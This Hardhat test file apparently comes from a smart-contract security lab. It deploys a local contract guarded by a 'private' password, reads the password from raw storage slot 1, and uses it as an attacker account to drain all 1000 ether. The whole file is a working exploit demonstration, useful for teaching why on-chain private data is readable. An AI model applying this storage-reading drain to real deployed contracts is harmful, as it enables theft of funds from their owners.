const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Private Variable contract", () => {
  let deployer, attacker;

  beforeEach(async () => {
    [deployer, attacker] = await ethers.getSigners();

    const PVcontract = await ethers.getContractFactory(
      "PrivateVariable",
      deployer
    );
    this.pvContract = await PVcontract.deploy(
      ethers.utils.formatBytes32String("myPassword")
    );
    await this.pvContract.deposit({ value: ethers.utils.parseEther("1000") });
  });

  it("should be able to access private variable", async () => {
    let initailBalenceContract = await ethers.provider.getBalance(
      this.pvContract.address
    );
    let initialBalanceAttacker = await ethers.provider.getBalance(
      attacker.address
    );

    console.log(
      "Contract initial balance:",
      ethers.utils.formatEther(initailBalenceContract.toString())
    );
    console.log(
      "Attacker initial balance:",
      ethers.utils.formatEther(initialBalanceAttacker.toString())
    );

    let pv = await ethers.provider.getStorageAt(this.pvContract.address, 1);

    let password = await ethers.utils.parseBytes32String(pv);

    console.log("=================");
    console.log("password:", password);
    console.log("=================");
    await this.pvContract.connect(attacker).withdraw(pv);

    let finalBalenceContract = await ethers.provider.getBalance(
      this.pvContract.address
    );
    let finalBalanceAttacker = await ethers.provider.getBalance(
      attacker.address
    );

    expect(finalBalenceContract).to.equal(0);
    expect(finalBalanceAttacker).to.gt(initialBalanceAttacker);

    console.log(
      "Contract final balance:",
      ethers.utils.formatEther(finalBalenceContract.toString())
    );
    console.log(
      "Attacker final balance:",
      ethers.utils.formatEther(finalBalanceAttacker.toString())
    );
  });
});
